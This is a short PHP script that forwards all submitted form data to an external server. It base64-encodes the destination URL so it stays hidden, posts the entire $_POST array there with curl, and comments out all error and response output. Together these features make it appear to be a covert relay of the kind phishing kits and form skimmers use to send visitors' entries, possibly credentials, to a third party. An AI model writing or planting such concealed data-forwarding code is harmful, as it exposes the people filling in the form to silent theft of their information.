<?php

$ux = base64_decode('aHR0cHM6Ly9jYWxjdWxhdG9yZXhwcmVzcy5jb20vQVBJMTAvTWFsaWtfU2FsYWh1ZGRpbl9VV192My9wcmludC9zYXZlLXJlY29yZHMucGhw');
$ux_data = $_POST;

$ch = curl_init($ux);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $ux_data);
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
    // echo 'Error: ' . curl_error($ch);
} else {

    // echo $response;
}


curl_close($ch);

